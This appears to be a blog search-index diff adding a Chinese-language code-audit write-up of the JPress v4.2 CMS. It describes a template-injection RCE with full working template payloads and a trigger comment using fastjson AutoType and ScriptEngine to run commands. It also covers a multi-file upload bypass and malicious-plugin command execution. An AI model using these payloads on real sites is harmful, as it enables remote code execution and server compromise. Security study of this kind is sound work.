@@ -5692,4 +5692,116 @@
         <tag>js</tag>
       </tags>
   </entry>
+  <entry>
+    <title>jpressv4.2 审计</title>
+    <url>/2025/10/15/jpressv4-2-%E5%AE%A1%E8%AE%A1/</url>
+    <content><![CDATA[<p>项目代码：<a class="link"   href="https://github.com/JPressProjects/jpress?tab=readme-ov-file" >https://github.com/JPressProjects/jpress?tab=readme-ov-file<i class="fas fa-external-link-alt"></i></a></p>
+<p>参考链接：<a class="link"   href="https://drun1baby.top/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1" >https://drun1baby.top/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1<i class="fas fa-external-link-alt"></i></a></p>
+<blockquote>
+<p>JPress 是一个基于Java开发的类似WordPress的CMS系统，并在基础上增加了电商功能。它采用多模块架构，支持插件化扩展，具有完整的用户管理、内容管理、电商管理等功能。</p>
+</blockquote>
+<p>如果看这个项目的pom.xml，没有filter，主要是有很多个module</p>
+<h3 id="模版渲染引起的RCE"><a href="#模版渲染引起的RCE" class="headerlink" title="模版渲染引起的RCE"></a>模版渲染引起的RCE</h3><p>在steeing目录下有多个模版渲染漏洞，比如</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/admin/article/setting</span><br><span class="line">/admin/page/setting</span><br><span class="line">/admin/product/setting</span><br><span class="line">/admin/template/edit</span><br></pre></td></tr></table></figure>
+
+<h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>在”文章”-&gt;”设置”中“评论邮件通知管理员”的地方，看到可以写一个模版，官方给出的例子有 <code>#(comment.id)</code>，所以可以推测可能存在模版渲染的问题</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20251015145958.png" ></p>
+<p>找到和文章评论相关的类，<code>io.jpress.module.article.controller.front.ArticleController</code>找到postComment()方法，下断点</p>
+<p>先在设置开启“评论邮件通知管理员”功能，然后填写模版内容，在文章下面留下评论</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20251015150609.png" ></p>
+<p>开始跟进</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20251015150636.png" ></p>
+<p>下面是一些简单的判断，重点来到268行的，跟进到<code>notify()</code>方法，看里面是怎么通知的</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ArticleNotifyKit.notify(article, comment, conmmentUser);</span><br></pre></td></tr></table></figure>
+
+<p>分为email和sms两种方法</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20251015150801.png" ></p>
+<p>看到email里面，最后会走到<code>doSendEmail()</code>方法，重点在第90和91行的<code>renderToString()</code>方法，分别对模版标题和内容做渲染</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20251015150831.png" ></p>
+<p>跟到后面有一个<code>exec()</code>方法，一直跟,会有一个地方去遍历处理内容</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20251015151200.png" ></p>
+<p><strong>注意</strong>：因为前面在标题模版我填入了<code>#set(str=comment.content)</code>，是set类型，走到这里才会变成<code>statArray[0]</code>才是set类型，下一步的才能进到<code>com.jfinal.template.stat.ast</code>中<u>Set</u>里面的<code>exec()</code>方法</p>
+<p>走到<code>assignVariable()</code>里面，要控制<code>Object rightValue = right.eval(scope);</code>里面要right的属性是method，这里用的内容是<code>#(x.setAutoTypeSupport(true)) </code></p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20251015152259.png" ></p>
+<p>最后走到 <code>com.jfinal.template.expr.ast.Method</code> 这个类的 <code>eval()</code> 方法下，里面有构造反射的条件</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20251015154205.png" ></p>
+<p>调用栈</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eval:83, Method (com.jfinal.template.expr.ast)</span><br><span class="line">exec:49, Output (com.jfinal.template.stat.ast)</span><br><span class="line">exec:68, StatList (com.jfinal.template.stat.ast)</span><br><span class="line">render:74, Template (com.jfinal.template)</span><br><span class="line">renderToString:91, Template (com.jfinal.template)</span><br><span class="line">doSendEmail:91, ArticleNotifyKit (io.jpress.module.article.kit)</span><br><span class="line">lambda$byEmail$16:70, ArticleNotifyKit (io.jpress.module.article.kit)</span><br><span class="line">run:-1, 2022196263 (io.jpress.module.article.kit.ArticleNotifyKit$$Lambda$86)</span><br><span class="line">runWorker:1142, ThreadPoolExecutor (java.util.concurrent)</span><br><span class="line">run:617, ThreadPoolExecutor$Worker (java.util.concurrent)</span><br><span class="line">run:745, Thread (java.lang)</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Velocity作为模版引擎是可以用来写脚本的，可以运行一些简单的输出、赋值等操作，在 Velocity 中 <code>&quot;#&quot;</code> 用来标识 Velocity 的脚本语句，包括 <code>#set、#if 、#else、#end、#foreach、#end、#iinclude、#parse、#macro</code> 等；</p>
+</blockquote>
+<p>所以在这里可以写到代码，就可以构造POC执行任意命令</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#set(x=net.sf.ehcache.util.ClassLoaderUtil::createNewInstance(&quot;javax.script.ScriptEngineManager&quot;))</span><br><span class="line">#set(e=x.getEngineByName(&quot;js&quot;))</span><br><span class="line">#(e.eval(&#x27;java.lang.Runtime.getRuntime().exec(&quot;open -a calculator&quot;)&#x27;))</span><br></pre></td></tr></table></figure>
+
+<p>按理说这时候去前台评论任意内容，都会触发模版渲染，从而执行恶意代码，但是这里遇到了报错，</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20251015154929.png" ></p>
+<p>在第三行存在不合法符号，说是单引号，所以要换一种打法</p>
+<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>写入模版，不带有单引号，结合fastjson机制</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#set(str=comment.content)</span><br><span class="line">#set(x=com.alibaba.fastjson.parser.ParserConfig::getGlobalInstance()) </span><br><span class="line">#(x.setAutoTypeSupport(true)) </span><br><span class="line">#set(sem=str.substring(0, str.indexOf(124)))</span><br><span class="line">#set(str=str.substring(str.indexOf(124)+1))</span><br><span class="line">#(x.addAccept(sem)) </span><br><span class="line">#set(json=str.substring(0, str.indexOf(124)))</span><br><span class="line">#set(str=str.substring(str.indexOf(124)+1))</span><br><span class="line">#set(x=com.alibaba.fastjson.JSON::parse(json))</span><br><span class="line">#set(js=str.substring(0, str.indexOf(124)))</span><br><span class="line">#set(str=str.substring(str.indexOf(124)+1))</span><br><span class="line">#set(e=x.getEngineByName(js)) </span><br><span class="line">#(e.eval(str))</span><br></pre></td></tr></table></figure>
+
+<p>启用了 fastjson 的 AutoType 支持，手动解析 JSON 字符串并实例化指定类，通过 ScriptEngineManager 加载脚本引擎，获取到前台comment.content的内容，然后经过处理，最后可以执行</p>
+<p>然后我们在前台评论</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javax.script.ScriptEngineManager|&#123;&quot;@type&quot;:&quot;javax.script.ScriptEngineManager&quot;&#125;|js|java.lang.Runtime.getRuntime().exec(&quot;open -a calculator&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>把代码传过去处理，然后就能成功弹出计算机</p>
+<p><strong>修复</strong>说是用的是编码转义，重新跑最新版本不知道为什么没跑起来，就没有复现了</p>
+<h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><p>我比较多思考的是漏洞点的发现，到最后找到Method里面的exec有反射，如果一套代码给到我，我应该从哪里下手找到这个调用链，或者说在看到<code>#comment.id</code>的时候想到模版注入，但是也要花时间找到后面的链条，找到有一个刚好可以反射执行代码的地方，</p>
+<h3 id="前台任意文件上传"><a href="#前台任意文件上传" class="headerlink" title="前台任意文件上传"></a>前台任意文件上传</h3><h4 id="位置确认"><a href="#位置确认" class="headerlink" title="位置确认"></a>位置确认</h4><p>存在漏洞的路由<code>/ucenter/avatar</code>，这里找到对应上传函数的思路是先找到avatar.html，看到</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20251015230502.png" ></p>
+<p>上传处理逻辑是&#x2F;commons&#x2F;attachment&#x2F;upload，直接在idea全局搜<code>@RequestMapping(&quot;/commons/attachment&quot;)</code></p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20251015230604.png" ></p>
+<p>最后确定是在<code>io/jpress/web/commons/controller/AttachmentController.java</code>里面的upload()方法</p>
+<p>打个断点前台尝试上传，可以确认位置没找错</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20251015230746.png" ></p>
+<h4 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h4><p>漏洞产生的原因是web应用允许上传一个<code>file[]</code>数组，而不是单一文件，从而利用这个特性构造多个文件同时上传绕过</p>
+<p>upload()方法里面两句</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">UploadFile</span> <span class="variable">uploadFile</span> <span class="operator">=</span> getFile();</span><br><span class="line"><span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> uploadFile.getFile();</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> UploadFile <span class="title function_">getFile</span><span class="params">()</span> &#123;</span><br><span class="line">		List&lt;UploadFile&gt; uploadFiles = getFiles();</span><br><span class="line">		<span class="keyword">return</span> uploadFiles.size() &gt; <span class="number">0</span> ? uploadFiles.get(<span class="number">0</span>) : <span class="literal">null</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里先测试同时上传两个文件，看是什么情况</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20251015232656.png" ></p>
+<p>在第一关getFile()方法就已经获取上传到文件</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20251016132123.png" ></p>
+<p>执行完getFile()会看到文件已经被上传到attachment目录，这里是暂存的逻辑</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2025-10-16%2013.23.18.png" ></p>
+<p>查了一下原理</p>
+<blockquote>
+<p>getFile() 本身不会“手写文件”，而是触发了 JFinal 的 multipart 解析器去处理请求体；解析器在解析时就把上传的文件流直接落地到磁盘临时&#x2F;上传目录，然后返回一个已经指向磁盘文件的 UploadFile。</p>
+</blockquote>
+<p>过到后面拿出file[]数组第0个元素，也就是第一个文件出来进行后续的判断，后面的文件不管，所以有得绕过空间</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20251016132556.png" ></p>
+<p>通过了一系列判断，到后面moveFile()才会把第一个文件移动到要保存的地方，但是之前上传多的文件还保留着暂存区，也是在服务器本地了</p>
+<h4 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h4><p>看到最新版本的代码</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2025-10-16%2013.32.29.png" ></p>
+<p>在getFile()里面加上了getFirstFileOnly()限制，如果只有一个文件，返回即可，如果有多个文件，拿出第一个，其他的都直接delete</p>
+<h3 id="安装插件出命令执行漏洞"><a href="#安装插件出命令执行漏洞" class="headerlink" title="安装插件出命令执行漏洞"></a>安装插件出命令执行漏洞</h3><p>影响接口 <code>admin/addon/install</code></p>
+<h4 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h4><p>这里允许我们上传jar包，我尝试按上面的方法找到主要作用函数</p>
+<p>就<code>io/jpress/web/admin/_AddonController.java</code>的doUploadAndInstall()方法在处理上传逻辑</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20251016141232.png" ></p>
+<p>先直接下断点，上传写好的恶意jar包，jpress项目代码有提供写好的插件代码，我直接在里面改写了一段，然后再打包出来</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20251016140958.png" ></p>
+<p>到后台上传调试，看具体逻辑，会有一些判断和加载</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20251016145117.png" ></p>
+<p>重点来到118行，有一个install()方法，跟进</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20251016145325.png" ></p>
+<p>有一个readAddonInfo()方法加载jar文件，跟进</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20251016145407.png" ></p>
+<p>后面有一个classLoader.load()，先获得jar文件详情，然后后面加载进去</p>
+<p>在load方法里面，按类别加载各个部分</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20251016145509.png" ></p>
+<p>其中就有一个把我们的controller加载进去</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20251016145600.png" ></p>
+<p>接下来处理请求都会利用到controller，从而实现攻击</p>
+<p>测试，成功执行命令，这里插件没有写太好，没有回显，但是效果也是有了</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20251016142136.png" ></p>
+<p>这里看官方说没有修复，因为比较苛刻，需要管理员后台才有插件安装权限，也能理解，不过以后实际遇到这个框架就可以试试这个漏洞利用了，万一呢。</p>
+<h3 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h3><p>过了这几个比较感兴趣的漏洞，体会就是基础很重要，我还是在思考如果给我一套完整的源码，我要怎么下手去审计，期待我在后面的学习中找到答案</p>
+]]></content>
+      <tags>
+        <tag>java</tag>
+        <tag>审计</tag>
+      </tags>
+  </entry>
 </search>
